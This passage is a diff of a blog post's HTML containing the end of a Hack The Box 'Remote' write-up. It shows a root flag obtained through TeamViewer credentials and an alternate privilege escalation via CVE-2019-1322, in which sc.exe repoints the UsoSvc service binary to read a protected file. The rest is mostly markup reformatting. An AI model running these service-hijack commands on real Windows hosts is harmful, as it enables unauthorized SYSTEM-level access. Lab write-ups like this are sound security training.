 and connect as administrator using
 the TeamViewer password and got a shell as administrator and can easily get
@@ -410,7 +352,6 @@ C:\Windows\system32&gt;cd C:\Users\administrator\Desktop
 C:\Users\Administrator\Desktop&gt;type root.txt
 66f9b552d94ea7c55919dc1bfbaff7e1
 </code></pre></div>
-
 <h2>Using CVE-2019-1322</h2>
 <p>There is another unintended method to root this box. This method is not reliable
 as the command to start the Update Orchestrator Service sometime return an error
@@ -450,7 +391,6 @@ CVE-2019-1322.</p>
       [!] CVE-2019-1405 : VULNERABLE
         [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
 </code></pre></div>
-
 <p>As the <a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/">article</a>
 precise we can run commands as <code>SYSTEM</code> on the box so we stop the service,
 configure it to copy the root flag in <code>C:\a.txt</code> and start the service again.</p>
@@ -461,8 +401,8 @@ sc.exe stop UsoSvc
 The service has not been started.
 
 
-C:\windows\system32\inetsrv&gt;sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;
-sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;
+C:\windows\system32\inetsrv&gt;sc config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt"
+sc config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt"
 [SC] ChangeServiceConfig SUCCESS
 
 C:\windows\system32\inetsrv&gt;sc.exe start UsoSvc
@@ -471,78 +411,55 @@ sc.exe start UsoSvc
 
 The service did not respond to the start or control request in a timely fashion.
 </code></pre></div>
-
 <p>We can now get the root flag.</p>
 <div class="highlight"><pre><span></span><code>C:\windows\system32\inetsrv&gt;type C:\a.txt
 type C:\a.txt
 66f9b552d94ea7c55919dc1bfbaff7e1
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was supposed to be easy. Clearly the root part took me way too long. My
 metasploit was outdated and doesn't had the post module for TeamViewer. And
 after getting the TeamViewer credentials I really tried to connect using the
 solution.</p>
 <p>Nevertheless the box was really interesting.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/windows.html">windows</a>
-      <a href="../../tag/umbraco.html">umbraco</a>
-      <a href="../../tag/teamviewer.html">teamviewer</a>
-      <a href="../../tag/metasploit.html">metasploit</a>
-      <a href="../../tag/msfvenom.html">msfvenom</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/10/htb-blunder.html" title="HTB: Blunder">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/11/htb-tabby.html" title="HTB: Tabby">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/windows.html">windows</a>
+<a href="../../tag/umbraco.html">umbraco</a>
+<a href="../../tag/teamviewer.html">teamviewer</a>
+<a href="../../tag/metasploit.html">metasploit</a>
+<a href="../../tag/msfvenom.html">msfvenom</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/10/htb-blunder.html" title="HTB: Blunder">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/11/htb-tabby.html" title="HTB: Tabby">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -553,6 +470,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
